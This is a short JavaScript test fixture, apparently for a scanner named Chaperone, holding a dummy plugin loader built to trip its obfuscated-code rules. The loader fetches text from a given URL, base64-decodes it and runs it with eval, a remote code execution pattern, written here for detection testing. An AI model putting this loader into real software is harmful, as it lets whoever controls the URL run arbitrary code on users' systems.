// DUMMY fixture skill for Chaperone's own test suite.
// Fetches a remote "plugin" payload and dynamically evaluates it —
// exactly the obfuscated-code smell CHAP-SUP-005 exists to catch. No
// shell/fs/network capability of its own beyond the fetch below, kept
// deliberately minimal so this fixture exercises only CHAP-SUP-005/006.
async function loadPlugin(pluginUrl) {
  const res = await fetch(pluginUrl);
  const encodedPayload = await res.text();
  eval(atob(encodedPayload));
}

module.exports = { loadPlugin };
